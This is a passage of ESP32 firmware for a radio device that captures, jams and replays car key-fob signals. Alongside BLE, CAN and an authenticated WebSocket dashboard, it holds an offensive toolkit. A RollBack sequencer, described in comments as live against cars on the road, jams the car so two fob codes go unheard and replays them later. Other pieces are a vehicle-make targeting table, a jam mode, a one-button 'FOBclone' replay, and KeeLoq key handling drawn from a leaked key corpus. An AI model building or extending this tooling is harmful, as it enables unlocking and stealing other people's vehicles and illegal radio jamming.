bool gdo0Routed = false;

// Per-stage capture diagnostics. Off by default; `{"cmd":"cap_diag","on":true}` turns it on
// and the next capture logs how many pulses survive each post-processing stage. This exists
// because a capture that reaches the gates with transitions and leaves empty reports only
// "Too few edges", which does not say which gate dropped it (research/50 §4).
bool lastCapDiag = false;

bool captureSignal(uint16_t timeoutMs,uint32_t gapUs);

// Forward declarations: these are defined further down, but the C2/C1 sequencers,
// fbkAppend and fbkImportFrame all call them before that point.
static int  rjTrimKiaV34(const uint16_t* w,int len,uint16_t* out,int outCap,int* anchorOut=nullptr);

// ─── C2: RollBack sequencer ─────────────────────────────────────────────────
// The RollBack attack against a rolling-code receiver with a resync window:
// capture two consecutive valid codes from the fob (by jamming so the car never
// hears them), then later transmit code 1 followed by code 2. The receiver sees
// code 1 as "behind" and, on receiving code 2 next, re-learns the counter — and
// the code it never heard (the one the fob broadcast while jammed) becomes
// replayable. This is the mechanism behind CVE-2026-49319 and
// CVE-2022-37418/36945, i.e. it is live against cars on the road.
//
// Why here: FOBback already captures a run of raw codes into fbkBuf. RollBack is
// the same capture with a specific two-code transmission order and a configurable
// gap, so it is a sequencer on top of existing machinery rather than new capture
// code. research/04 C2.
//
// Guard rails, deliberately conservative because this transmits:
//   · exactly two codes, code 0 then code 1 — never a loop
//   · requires an explicit arm; never triggered by a scan or a decode
//   · single-shot: must be re-armed, so a double tap cannot re-fire
//   · refuses if fewer than 2 captures are held
//   · hard window on the inter-code gap
//   · stopJam() is called on every exit path, including the error paths, because
//     a jam that will not stop is the worst failure mode of any TX feature here
enum RBPhase : uint8_t { RB_IDLE=0, RB_GAP, RB_DONE };
static RBPhase  rbPhase   = RB_IDLE;
static uint32_t rbT0      = 0;
static uint32_t rbGapMs   = 120;     // pause between the two codes
static bool     rbArmed   = false;   // consumed on fire; a fresh arm is required
static String   rbLastJson = "{\"event\":\"rollback\",\"state\":\"idle\"}";

// Gap bounds. Long enough to be seen as two separate presses, short enough that
// the receiver's resync window is not exceeded.
#define RB_GAP_MIN_MS   40
#define RB_GAP_MAX_MS 2000

// replayRaw() is defined further down (with the other TX helpers). Declared here
// so the sequencer below can call it without moving either one; the Arduino
// auto-prototype block does not cover this because it is emitted above the first
// function, which is after this point.
bool replayRaw(float mhz,uint16_t* data,int len,int reps,bool startHigh);
bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int reps);


// ─── Protocol / Vehicle-Make Capture Filters ─────────────────────────────────
// Empty string = no filter (all protocols / all vehicles accepted).
// filterProto   : target protocol name, e.g. "KeeLoq", "Toyota-Denso".
// filterVehicle : vehicle make name, e.g. "Toyota", "VW/Audi".
// These are mutually exclusive — setting one clears the other.
String filterProto   = "";
String filterVehicle = "";

// Vehicle-make → allowed protocol list + hint frequency.
// proto1 is the primary; proto2/proto3 are secondary (e.g. BMW also has BMW-CAS4).
struct VehicleProfile {
  const char* make;
  const char* proto1; const char* proto2; const char* proto3;
  float freq1; float freq2;
};
static const VehicleProfile VEHICLES[] = {
  {"Toyota",    "Toyota-Denso",  "",               "",                315.00f, 312.20f},
  {"Lexus",     "Toyota-Denso",  "",               "",                315.00f, 312.20f},
  {"Honda",     "Honda-RKE",     "",               "",                433.92f, 315.00f},
  {"Acura",     "Honda-RKE",     "",               "",                433.92f, 315.00f},
  {"Ford",      "Ford-RKE",      "",               "",                315.00f,   0.f  },
  {"Ford EU",   "Ford-RKE",      "",               "",                433.92f,   0.f  },
  {"GM",        "KeeLoq",        "",               "",                315.00f,   0.f  },
  {"Chevrolet", "KeeLoq",        "",               "",                315.00f,   0.f  },
  {"Nissan",    "Nissan-RKE",    "",               "",                315.00f, 433.92f},
  {"Infiniti",  "Nissan-RKE",    "",               "",                315.00f,   0.f  },
  {"Subaru",    "Subaru-RKE",    "",               "",                315.00f,   0.f  },
  {"Mazda",     "Mazda-Siemens", "",               "",                315.00f, 433.92f},
  {"VW/Audi",   "KeeLoq",        "VAG-pre2004",    "",                433.92f,   0.f  },
  {"Volkswagen","KeeLoq",        "",               "",                315.00f, 433.92f},
  {"BMW",       "KeeLoq",        "BMW-CAS4",       "",                433.92f, 868.30f},
  {"Mercedes",  "KeeLoq",        "",               "",                433.92f, 868.30f},
  {"Hyundai",   "KeeLoq",        "KIA-V0",         "Hyundai-SantaFe",433.92f, 315.00f},
  {"Kia",       "KeeLoq",        "KIA-V0",         "KIA-V1",          433.92f, 315.00f},
  {"Genesis",   "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Chrysler",  "Chrysler",      "",               "",                315.00f, 433.92f},
  {"Dodge",     "Chrysler",      "",               "",                315.00f, 433.92f},
  {"Jeep",      "Chrysler",      "",               "",                315.00f, 433.92f},
  {"Peugeot",   "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Citroen",   "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Renault",   "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Opel",      "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Vauxhall",  "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Fiat",      "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Alfa Romeo","KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Volvo",     "KeeLoq",        "",               "",                433.92f,   0.f  },
  {"Mitsubishi","KeeLoq",        "",               "",                433.92f,   0.f  },
};
#define N_VEHICLES (sizeof(VEHICLES)/sizeof(VEHICLES[0]))

bool scanActive = true;
bool scanUserPaused = false; // true when user explicitly paused via scan_toggle; survives captures
bool jamActive  = false;     // true while continuous-carrier jam is transmitting
float jamFreq   = 0.0f;      // frequency currently being jammed (MHz)
int  scanIdx = 0;
float sweepMin = 0.0f;    // Range sweep lower bound (MHz); 0 = no lower limit
float sweepMax = 9999.0f; // Range sweep upper bound (MHz); 9999 = no upper limit
float capRangeMin = 0.0f;    // Capture-sweep lower bound (MHz); 0 = full sweep
float capRangeMax = 9999.0f; // Capture-sweep upper bound (MHz)
// Auto-capture squelch threshold (dBm). Only signals above this level trigger
// an automatic capture during scan mode. Raise (e.g. -55) to reduce false
// captures from nearby 433 MHz devices; lower (e.g. -75) for distant fobs.
// Adjustable at runtime: {"cmd":"squelch","dbm":-60}
int  autoCapDbm = -55;
unsigned long scanLast = 0;
// Sticky-linger state — set after a confident fob is decoded during auto-scan.
// Biases the sweep to dwell longer on/near that frequency for follow-up presses.
// Reset to 0 when the scan is explicitly restarted via toggle command.
float   stickyFreq = 0.0f; // 0 = no sticky (full-speed sweep)
uint8_t stickyPrio = 0;    // 1 = heuristic fob · 2 = KeeLoq / Toyota-Denso

// ── BLE scanner (ESP32-S3 built-in BLE radio) ─────────────────────────────────
struct BleEntry {
  char addr[18];
  char name[33];
  int  rssi;
  char uuids[200];
  char mfrHex[48];
  char system[28];
};
static BleEntry bleDevs[20];
static int           bleDevCount  = 0;
static bool          bleInited    = false;
static volatile bool bleScanBusy  = false;
static volatile bool bleScanReady = false;
static uint32_t      bleLastScanMs = 0;

// ── BLE pairing / IRK tracking state ──────────────────────────────────────────
// When blePairMode=true the GATT server is advertising for pairing.
// After successful bond, blePairDone=true and blePairLastAddr holds the addr.
// IRKs are stored by the ESP32 BLE stack in flash (bond table) automatically.
static bool     blePairMode    = false;
static bool     blePairDone    = false;
static uint32_t blePairStartMs = 0;
static char     blePairLastAddr[18] = "";
static uint8_t  blePairCount   = 0;

// ── CAN / TWAI capture state ───────────────────────────────────────────────────
// Requires external transceiver (SN65HVD230, TJA1050, or MCP2551).
// Fixed board-approved pins: TX=17, RX=16. The HTTP API accepts these values
// explicitly for compatibility but rejects all alternate pin assignments.
#define CAN_BUF_SZ 60
#define CAN_SAFE_TX_PIN 17U
#define CAN_SAFE_RX_PIN 16U
struct CanFrame { char id[12]; bool ext; bool rtr; uint8_t dlc; char data[25]; uint32_t ts; };
static CanFrame  canBuf[CAN_BUF_SZ];
static int       canBufHead    = 0;
static int       canBufCount   = 0;
static bool      canInited     = false;
static bool      canActive     = false;
static uint32_t  canFrameTotal = 0;
static uint32_t  canTxPin      = CAN_SAFE_TX_PIN;
static uint32_t  canRxPin      = CAN_SAFE_RX_PIN;
static uint32_t  canBaud       = 500000;

// Non-blocking WiFi capture state (avoids re-entrant srv.handleClient crash)
bool captureRequested   = false; // set by /api/capture_start
bool captureInProgress  = false; // set by main loop while running
bool captureResultReady = false; // set by main loop when done
uint16_t capTimeoutOverride = CAP_TIMEOUT_MS; // dashboard-selected duration (ms)
// Auto-scan signal queue — 4-slot FIFO so rapid captures don't overwrite each other before the
// WiFi dashboard's background poll (every 1.5 s) has a chance to read them.
#define SIGQ_MAX 4
static String sigQ[SIGQ_MAX];
static int sigQHead = 0, sigQTail = 0;
// sigQ helpers defined after struct declarations (below) to keep the Arduino preprocessor's
// prototype-injection point past all struct definitions.

struct ScanTick { float freq; int rssi; uint32_t ts; };
ScanTick scanLog[128]; int scanLogN = 0;

struct SavedKey { bool used; String name; float freq; uint16_t data[KEY_SZ]; int len; bool sh; };
SavedKey keys[MAX_KEYS];

struct HistEntry { uint32_t sn,hop,ctr; uint8_t proto; float freq; uint32_t ts; };
static HistEntry hist[HIST_SZ];
static uint8_t histI = 0, histC = 0;

struct KLFrame { uint32_t sn,hop; uint8_t btn,sts; uint32_t rawCtr; };
struct KLPred  { int32_t delta; uint32_t nextCtr,nextHop; float linEst;
                 bool found,bwValid,pattern; uint32_t bw[10]; const char* kname; uint64_t foundKey;
                 uint8_t learn;      // KLLearn of the matching key (0 = unknown)
                 bool candidate; };  // matched once, not yet confirmed by a second frame

// Field layout recovered from an 8-byte payload.
struct KiaV34Frame {
  uint32_t encrypted;
  uint32_t serial;
  uint8_t  btn;
  uint8_t  crc;
  uint32_t decrypted;   // valid only when validated==true
  uint16_t ctr;         // valid only when validated==true
  bool     v3;          // true when the V3 interpretation validated
  bool     validated;
};

#define KL_CAND_MAX 8          // candidates retained per frame (expected: ~1.3)
struct KLCand { const char* name; uint64_t key; uint8_t learn; bool suspect; };


// ─── KeeLoq learning type ─────────────────────────────────────────────────────
// Carried per manufacturer key. The learning type decides which key
// diversification the device key came from, so it decides which derivations are
// worth generating for that key. Values and meanings match the leaked-corpus
// type field and the reference keeloq_common.h (see research/01, section 1).
//   UNKNOWN   — type not recorded; several interpretations are possible, so a
//               match is reported as unconfirmed.
//   SIMPLE    — device key == manufacturer key.
//   NORMAL    — device key = KDF(serial, mfr key) per Microchip TB003 / AN742.
//   SECURE    — device key = KDF(seed, mfr key) per TB001; needs the seed, which
//               a sniffed rolling frame does not carry. Not derivable from a hop.
//   MAGIC_*   — clone-chip schemes; the "key" is a mix of mfr key bytes and serial.
//   FAAC      — FAAC SLH seed scheme; needs the 32-bit seed, same limitation as SECURE.
//   BENINCA_ARC / KINGGATES / JAROLIFT — vendor schemes; ARC is AES-128, not KeeLoq.
//   HEURISTIC — not a published scheme. The derivation exists only as a guess at
//               how an undocumented receiver might mix key and serial. A match on
//               a heuristic is a lead to verify, never an identification.
enum KLLearn : uint8_t {
  KL_UNKNOWN=0, KL_SIMPLE=1, KL_NORMAL=2, KL_SECURE=3, KL_MAGIC_XOR1=4,
  KL_FAAC=5, KL_MAGIC_SER1=6, KL_MAGIC_SER2=7, KL_MAGIC_SER3=8,
  KL_BENINCA_ARC=9, KL_KINGGATES=10, KL_JAROLIFT=11, KL_HEURISTIC=12
};

// Manufacturer key row.
//   learn   — KLLearn value above.
//   suspect — 1 when a match against this key must not be reported as a
//             confident identification: the learning type is unrecorded, or the
//             key is a factory default (all-zero / all-ones). This is what the
//             dashboard's "pattern" badge means. 0 for a real, typed key.
struct MfrKey  { const char* name; uint64_t key; uint8_t learn; uint8_t suspect; };

// Stack high-water sampler (research/28 §3.2). Defined here, after the type declarations,
// because the sketch preprocessor hoists prototypes above the body -- a function defined
// earlier would land before these types exist.
static void stackSample(){
  UBaseType_t b=uxTaskGetStackHighWaterMark(NULL);   // already BYTES on this port
  if((uint32_t)b<stackHwmMinBytes) stackHwmMinBytes=(uint32_t)b;
}

// sigQ helpers — placed here so all struct types above are visible to the Arduino
// preprocessor's auto-generated prototype block, which is injected before the first function.
// This stays the first function in the sketch. The Arduino builder inserts
// generated prototypes immediately above it, and those prototypes name the
// structs declared above. Moving a function above that struct block breaks the build.
// Clamp a JSON-supplied element time (µs) to a sane OOK range; rejects negative or
// absurd values that would otherwise cast into malformed / multi-second bit-bang bursts.
static inline int clampTe(int te){ return (te>=50 && te<=5000) ? te : 360; }
static inline bool sigQEmpty(){ return sigQHead==sigQTail; }
static inline bool sigQFull(){ return ((sigQTail+1)%SIGQ_MAX)==sigQHead; }
static void sigQPush(const String& s){ if(!sigQFull()){ sigQ[sigQTail]=s; sigQTail=(sigQTail+1)%SIGQ_MAX; } }
static bool sigQPop(String& out){ if(sigQEmpty()) return false; out=sigQ[sigQHead]; sigQHead=(sigQHead+1)%SIGQ_MAX; return true; }

// ─── Button state ─────────────────────────────────────────────────────────────
// Tap-counting gesture decoder. checkButton() is the behavior that runs:
//   Single tap   → FOBscan headless, or FOBclone replay / band step when that mode is active
//   Two or more  → toggle FOBclone headless
//   Hold 3 s     → power off → light sleep (3 s hold to wake)
unsigned long btnDown      = 0;   // millis() when button went LOW (0 = not pressed)
static bool   btnHoldFired = false;
static uint8_t btnTapCnt   = 0;
static unsigned long btnLastUp = 0;

// ─── Headless-scan / freq-preset state ────────────────────────────────────────
#define HS_MAX  8   // max signals stored in NVS standalone library

bool headlessActive = false;  // true = scanning + saving without dashboard

struct FreqPreset { const char* name; float sMin, sMax; };
static const FreqPreset FREQ_PRESETS[] = {
  { "NA (300-320)",  299.0f,  320.0f },
  { "EU (433-435)",  433.0f,  435.0f },
  { "ALL (300-928)",   0.0f, 9999.0f },
};
#define N_PRESETS 3
static uint8_t freqPresetIdx = 2;  // default: ALL

// ─── FOBclone headless state ──────────────────────────────────────────────────
// FOBclone headless watches auto-captures for rolling-code vehicle fobs.
// After 1 capture (delta unknown): amber blink — press the fob a 2nd time.
// After 2+ captures (delta known): green flash — press device button to replay.
#define HFC_SCANNING    0   // waiting for first rolling-code capture
#define HFC_NEEDS_MORE  1   // 1 capture decoded — need one more for delta
#define HFC_READY       2   // delta known — press button to replay
bool    hfcActive = false;
uint8_t hfcState  = HFC_SCANNING;
String  hfcProto  = "";     // protocol name of last rolling-code capture
static Preferences hsPrefs;

// ─── LED / Buzzer / Battery ───────────────────────────────────────────────────
void setLed(uint8_t r,uint8_t g,uint8_t b){
  if(ledReinit){rgb.begin();ledReinit=false;}
  rgb.setPixelColor(0,rgb.Color(r,g,b)); rgb.show();
}
void beep(int hz,int ms){
  ledcAttach(PIN_BUZZ,hz,8); ledcWrite(PIN_BUZZ,64);
  delay(ms); ledcWrite(PIN_BUZZ,0); ledcDetach(PIN_BUZZ);
  ledReinit=true;
}
void readBatt(){
  Wire.beginTransmission(MAX17048_ADDR); Wire.write(0x02); Wire.endTransmission(false);
  Wire.requestFrom(MAX17048_ADDR,2); if(Wire.available()>=2){uint16_t r=(Wire.read()<<8)|Wire.read(); battV=r*78.125/1000000.0;}
  Wire.beginTransmission(MAX17048_ADDR); Wire.write(0x04); Wire.endTransmission(false);
  Wire.requestFrom(MAX17048_ADDR,2); if(Wire.available()>=2){uint16_t r=(Wire.read()<<8)|Wire.read(); battPct=r/256.0;}
}
void addLog(const String& s){ Serial.println(s); }
// Forward declarations for the WebSocket outbound path. serialEmit() is defined here but
// the WebSocket table lives below, so these must be visible first. serialTokenMatches() is
// declared for the same reason: wsHandler() now authenticates a slot on receipt, and it is
// defined below wsHandler().
volatile int      wsReplyTo    = -1;   // slot of the client that issued the current command
volatile uint32_t wsReplyToGen = 0;    // generation of that slot, so a reused slot cannot match
static void wsSendToSlot(int slot, uint32_t gen, const String& json);
static void wsBroadcast(const String& json);
static bool serialTokenMatches(const JsonDocument& command);

void serialEmit(const String& json){
  Serial.println(json);
  // Mirror the serial event stream to authenticated WebSocket clients here. Keeping one
  // outbound path means new events reach both dashboards without per-event routing code.
  //
  // A Wi-Fi command reply goes only to its sender (wsReplyTo, set in wsPump()). Other
  // events, including serial replies and capture results, go to authenticated clients.
  //
  // Declared here, defined with the rest of the WebSocket code below.
  int slot=wsReplyTo;
  if(slot>=0) wsSendToSlot(slot,wsReplyToGen,json);
  else        wsBroadcast(json);
}

// ─── WebSocket command/event transport (port 81) ──────────────────────────────
// The USB dashboard uses JSON over serial; Wi-Fi sends the same commands as WebSocket
// frames to port 81.
//
// Use esp_http_server (CONFIG_HTTPD_WS_SUPPORT=1). Arduino WebServer cannot upgrade
// the connection.
//
// The HTTP handler runs in its own FreeRTOS task. It queues commands for wsPump() to
// execute from loop(); commands must not run on the handler task because the firmware's
// buffers and radio state rely on a single command loop.
//
// serialEmit() forwards outbound events. Replies go to their requesting client; other
// events are broadcast to authenticated clients. The async send API is safe from loop().
#define WS_MAX_CLIENTS 4
#define WS_CMD_Q       4            // queued inbound commands (loop() drains each pass)
httpd_handle_t wsServer = nullptr;

// Registering a socket is not enough to receive events. Each slot stays unauthenticated
// until the client sends a valid token; broadcasts skip all other slots.
static int  wsFd[WS_MAX_CLIENTS]       = { -1, -1, -1, -1 };
static bool wsAuthed[WS_MAX_CLIENTS]   = { false, false, false, false };
// Slots are reused, so an index alone cannot identify the client that queued a reply.
// Each assignment gets a new generation; a reply is sent only if both still match.
static uint32_t wsGen[WS_MAX_CLIENTS]  = { 0, 0, 0, 0 };
static uint32_t wsGenNext              = 1;
// wsReplyTo (defined above, with serialEmit's forward declarations) names the slot that the
// reply currently being produced belongs to, or -1 for "no particular client" -- a serial
// command, a timer event, a capture.

static int wsSlotFor(int fd){
  for(int i=0;i<WS_MAX_CLIENTS;i++) if(wsFd[i]==fd) return i;
  return -1;
}
static void wsRemember(int fd){
  if(wsSlotFor(fd)>=0) return;
  for(int i=0;i<WS_MAX_CLIENTS;i++) if(wsFd[i]<0){
    wsFd[i]=fd; wsAuthed[i]=false; wsGen[i]=wsGenNext++; return; }
  // Table full: evict the oldest. It also gets a fresh generation, so any reply still queued
  // against the previous occupant is dropped rather than delivered to the new one.
  wsFd[0]=fd; wsAuthed[0]=false; wsGen[0]=wsGenNext++;
}
// True when (slot, gen) still names the connection that queued a command.
static bool wsSlotMatches(int slot, uint32_t gen){
  return slot>=0 && slot<WS_MAX_CLIENTS && wsFd[slot]>=0 && wsGen[slot]==gen;
}
// Called once a slot's client has presented a valid token. From here it may receive events.
static void wsMarkAuthed(int fd){
  int i=wsSlotFor(fd);
  if(i>=0) wsAuthed[i]=true;
}
static void wsForget(int fd){
  int i=wsSlotFor(fd);
  if(i>=0){ wsFd[i]=-1; wsAuthed[i]=false; wsGen[i]=0; }   // 0 never matches a queued gen
}
static int wsClientCount(){
  int n=0; for(int i=0;i<WS_MAX_CLIENTS;i++) if(wsFd[i]>=0) n++;
  return n;
}
static int wsAuthedCount(){
  int n=0; for(int i=0;i<WS_MAX_CLIENTS;i++) if(wsFd[i]>=0&&wsAuthed[i]) n++;
  return n;
}

// Send an event to authenticated clients. Drop slots whose send fails.
static void wsBroadcast(const String& json){
  if(!wsServer) return;
  for(int i=0;i<WS_MAX_CLIENTS;i++){
    int fd=wsFd[i];
    if(fd<0||!wsAuthed[i]) continue;
    httpd_ws_frame_t f{};
    f.type    = HTTPD_WS_TYPE_TEXT;
    f.payload = (uint8_t*)json.c_str();
    f.len     = json.length();
    if(httpd_ws_send_frame_async(wsServer, fd, &f)!=ESP_OK){ wsFd[i]=-1; wsAuthed[i]=false; }
  }
}

// Send a command reply only to its requester. Check both the slot generation and
// authentication before sending; otherwise a reused slot could expose a reply to a
// different client.
static void wsSendToSlot(int slot, uint32_t gen, const String& json){
  if(!wsServer || !wsSlotMatches(slot,gen) || !wsAuthed[slot]) return;
  int fd=wsFd[slot];
  httpd_ws_frame_t f{};
  f.type    = HTTPD_WS_TYPE_TEXT;
  f.payload = (uint8_t*)json.c_str();
  f.len     = json.length();
  if(httpd_ws_send_frame_async(wsServer, fd, &f)!=ESP_OK){ wsFd[slot]=-1; wsAuthed[slot]=false; wsGen[slot]=0; }
}

// The HTTP task writes the queue; loop() drains it. Each side updates a different index,
// so neither can overwrite the other's progress.
#define WS_LINE_MAX 2048
static char wsQ[WS_CMD_Q][WS_LINE_MAX];
static int      wsQFrom[WS_CMD_Q];    // slot that sent each queued line, for reply routing
static uint32_t wsQGen[WS_CMD_Q];     // that slot's generation, so a reused slot cannot match
static volatile int wsQTail=0;        // httpd writes here
static volatile int wsQHead=0;        // loop() reads here

static void wsEnqueue(const String& line,int fromSlot,uint32_t fromGen){
  int next=(wsQTail+1)%WS_CMD_Q;
  if(next==wsQHead) return;           // full: drop rather than overwrite
  int n=line.length(); if(n>WS_LINE_MAX-1) n=WS_LINE_MAX-1;
  memcpy(wsQ[wsQTail], line.c_str(), n);
  wsQ[wsQTail][n]='\0';
  wsQFrom[wsQTail]=fromSlot;
  wsQGen[wsQTail]=fromGen;
  wsQTail=next;
}

// Drain commands from loop(), not the HTTP task. Defined after the dispatcher.
static void wsPump();

static esp_err_t wsHandler(httpd_req_t* req){
  int fd = httpd_req_to_sockfd(req);
  if(req->method==HTTP_GET){          // handshake completes on the first GET callback
    // Track the socket, but do not send it events until it presents a valid token.
    wsRemember(fd);
    addLog("[WS] socket open ("+String(wsClientCount())+" conn, "
           +String(wsAuthedCount())+" authed)");
    return ESP_OK;
  }
  if(req->method==HTTP_DELETE){       // socket closed
    wsForget(fd);
    addLog("[WS] client disconnected ("+String(wsClientCount())+" left)");
    return ESP_OK;
  }
  // Receive into a static buffer owned by the single HTTP task. The loop-task buffers
  // are separate.
  static char rx[WS_LINE_MAX];
  httpd_ws_frame_t frame{};
  frame.type    = HTTPD_WS_TYPE_TEXT;
  frame.payload = (uint8_t*)rx;
  esp_err_t r = httpd_ws_recv_frame(req, &frame, sizeof(rx)-1);
  if(r!=ESP_OK || frame.len==0) return ESP_OK;
  if(frame.len > sizeof(rx)-1){
    String err=String("{\"ok\":false,\"error\":\"ws-frame-too-long\",\"max_bytes\":")+String((int)sizeof(rx)-1)+"}";
    httpd_ws_frame_t o{}; o.type=HTTPD_WS_TYPE_TEXT; o.payload=(uint8_t*)err.c_str(); o.len=err.length();
    httpd_ws_send_frame(req,&o);
    return ESP_OK;
  }
  rx[frame.len]='\0';
  String line(rx); line.trim();
  if(line.length()>=3 && line[0]=='{'){
    int slot = wsSlotFor(fd);
    // Authenticate before queueing so this client's first command can receive its reply.
    if(slot>=0 && !wsAuthed[slot]){
      JsonDocument jc;
      if(deserializeJson(jc,line)==DeserializationError::Ok && serialTokenMatches(jc)){
        wsMarkAuthed(fd);
        addLog("[WS] client authenticated ("+String(wsAuthedCount())+" of "
               +String(wsClientCount())+" subscribed)");
      }
    }
    // slot can be -1: a fifth connection evicts slot 0, and if that evicted socket then sends
    // a frame, wsSlotFor() no longer finds its fd. Guard BEFORE indexing wsGen -- an argument is
    // evaluated before the call, so wsSlotMatches()'s own check comes too late to save it.
    uint32_t gen = (slot >= 0) && wsSlotMatches(slot, wsGen[slot]) ? wsGen[slot] : 0;
    wsEnqueue(line,slot,gen);
  }
  return ESP_OK;
}

static void wsStart(){
  httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
  cfg.server_port      = 81;
  cfg.ctrl_port        = 32769;       // do not collide with any other httpd instance
  cfg.max_open_sockets = WS_MAX_CLIENTS + 2;
  cfg.lru_purge_enable = true;
  cfg.stack_size       = 6144;        // handler is shallow; it only frames and enqueues
  if(httpd_start(&wsServer, &cfg)!=ESP_OK){
    addLog("[WS] start FAILED -- WiFi dashboard mode unavailable");
    wsServer=nullptr;
    return;
  }
  httpd_uri_t uri{};
  uri.uri          = "/";
  uri.method       = HTTP_GET;
  uri.handler      = wsHandler;
  uri.is_websocket = true;
  httpd_register_uri_handler(wsServer, &uri);
  addLog("[WS] ws://"+WiFi.softAPIP().toString()+":81 ready");
}
static String serialInBuf="";

// ─── Per-device control-surface credentials ───────────────────────────────────
// Generate both secrets from the ESP32 hardware RNG and persist them in a
// dedicated NVS namespace. The revision marker is written last so a partial
// first-boot write is never treated as a valid credential set.
static const char DEVICE_SECRET_ALPHABET[] = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
static const size_t DEVICE_AP_PASSWORD_LEN = 16;
static const size_t DEVICE_API_TOKEN_LEN = 26;
static const uint8_t DEVICE_AUTH_REV = 1;

static String randomDeviceSecret(size_t len){
  String out;
  out.reserve(len);
  for(size_t i=0;i<len;i++) out += DEVICE_SECRET_ALPHABET[esp_random() & 31U];
  return out;
}

static bool validDeviceSecret(const String& value,size_t expectedLen){
  if(value.length()!=expectedLen) return false;
  for(size_t i=0;i<expectedLen;i++){
    bool found=false;
    for(size_t j=0;j<32;j++){
      if(value[i]==DEVICE_SECRET_ALPHABET[j]){found=true;break;}
    }
    if(!found) return false;
  }
  return true;
}

static bool constantTimeDeviceTokenMatches(const String& supplied){
  if(!deviceCredentialsReady||supplied.length()!=deviceApiToken.length()) return false;
  uint8_t diff=0;
  for(size_t i=0;i<deviceApiToken.length();i++)
    diff|=(uint8_t)(supplied[i]^deviceApiToken[i]);
  return diff==0;
}

static bool parseStrictUint32(const String& raw,uint32_t minValue,uint32_t maxValue,uint32_t& out){
  if(raw.length()==0||raw.length()>10) return false;
  uint64_t value=0;
  for(size_t i=0;i<raw.length();i++){
    char ch=raw[i];
    if(ch<'0'||ch>'9') return false;
    value=value*10U+(uint32_t)(ch-'0');
    if(value>maxValue) return false;
  }
  if(value<minValue) return false;
  out=(uint32_t)value;
  return true;
}

static bool serialTokenMatches(const JsonDocument& command){
  if(!command["token"].is<const char*>()) return false;
  return constantTimeDeviceTokenMatches(String(command["token"].as<const char*>()));
}

static bool loadOrCreateDeviceCredentials(){
  Preferences authPrefs;
  if(!authPrefs.begin("dev-auth",false)) return false;

  uint8_t rev=authPrefs.getUChar("rev",0);
  String apPassword=authPrefs.getString("ap-pass","");
  String apiToken=authPrefs.getString("api-token","");
  bool valid=rev==DEVICE_AUTH_REV &&
             validDeviceSecret(apPassword,DEVICE_AP_PASSWORD_LEN) &&
             validDeviceSecret(apiToken,DEVICE_API_TOKEN_LEN);

  if(!valid){
    authPrefs.clear();
    apPassword=randomDeviceSecret(DEVICE_AP_PASSWORD_LEN);
    apiToken=randomDeviceSecret(DEVICE_API_TOKEN_LEN);
    bool wroteAp=authPrefs.putString("ap-pass",apPassword)>0;
    bool wroteToken=authPrefs.putString("api-token",apiToken)>0;
    bool wroteRev=wroteAp&&wroteToken&&authPrefs.putUChar("rev",DEVICE_AUTH_REV)==1;
    valid=wroteRev;
  }

  authPrefs.end();
  if(!valid) return false;
  deviceApPassword=apPassword;
  deviceApiToken=apiToken;
  return true;
}

static void printDeviceCredentialsToSerial(){
  Serial.println("[SECURITY] Per-device credentials (USB serial only)");
  Serial.println("[SECURITY] WiFi SSID: " + String(AP_SSID));
  Serial.println("[SECURITY] WiFi password: " + deviceApPassword);
  Serial.println("[SECURITY] Dashboard access code: " + deviceApiToken);
}

// ─── Headless-scan NVS signal library ────────────────────────────────────────
// Signals captured while headless (standalone) mode is active are stored here.
// Up to HS_MAX entries as compact JSON (pulse_us stripped) in NVS namespace "hslib".
// On every boot, hsLib_emitAll() re-emits them so both dashboards populate the
// signal library without the user having to re-scan.

static void hsLib_save(const String& decode){
  // Strip pulse_us array (can be 1-2 KB) to keep each NVS entry small
  String compact = decode;
  int pi = compact.indexOf(",\"pulse_us\"");
  if(pi >= 0){
    int pe = compact.indexOf(']', pi);
    if(pe > pi) compact = compact.substring(0, pi) + compact.substring(pe + 1);
  }
  // Tag with headless provenance
  if(compact.endsWith("}"))
    compact = compact.substring(0, compact.length()-1) +
              ",\"headless\":true,\"hs_ms\":" + String(millis()) + "}";
  hsPrefs.begin("hslib", false);
  int cnt = hsPrefs.getInt("cnt", 0);
  int idx = hsPrefs.getInt("idx", 0);
  hsPrefs.putString(("s" + String(idx)).c_str(), compact);
  idx = (idx + 1) % HS_MAX;
  if(cnt < HS_MAX) cnt++;
  hsPrefs.putInt("cnt", cnt);
  hsPrefs.putInt("idx", idx);
  hsPrefs.end();
}

static void hsLib_emitAll(){
  hsPrefs.begin("hslib", true);
  int cnt = hsPrefs.getInt("cnt", 0);
  int idx = hsPrefs.getInt("idx", 0);
  hsPrefs.end();
  if(cnt == 0) return;
  addLog("[HS] Re-emitting " + String(cnt) + " headless-captured signal(s)");
  // Emit oldest first (ring buffer: start at idx-cnt wrapping around HS_MAX)
  int start = (idx - cnt + HS_MAX) % HS_MAX;
  for(int i = 0; i < cnt; i++){
    int slot = (start + i) % HS_MAX;
    hsPrefs.begin("hslib", true);
    String sig = hsPrefs.getString(("s" + String(slot)).c_str(), "");
    hsPrefs.end();
    if(sig.length() > 0){ sigQPush(sig); serialEmit(sig); delay(5); }
  }
}

static void hsLib_clear(){
  hsPrefs.begin("hslib", false);
  hsPrefs.clear();
  hsPrefs.end();
  addLog("[HS] Library cleared");
  serialEmit("{\"event\":\"hs_clear\"}");
}

// A kept decode has a protocol name and is not an unclassified OOK capture.
static bool decodeIsKept(const String& j){
  if(j.indexOf("\"error\"")>=0) return false;
  int p=j.indexOf("\"proto\":\"");
  if(p<0) return false;
  int s=p+9;
  int e=j.indexOf('"',s);
  if(e<=s) return false;
  String proto=j.substring(s,e);
  return proto.length()>0 && proto!="OOK-raw";
}

static String jsonQuotedField(const String& j,const char* key){
  String k="\""; k+=key; k+="\":\"";
  int i=j.indexOf(k);
  if(i<0) return "";
  i+=k.length();
  int e=j.indexOf('"',i);
  if(e<i) return "";
  return j.substring(i,e);
}

static String jsonRawField(const String& j,const char* key){
  String q=jsonQuotedField(j,key);
  if(q.length()) return q;
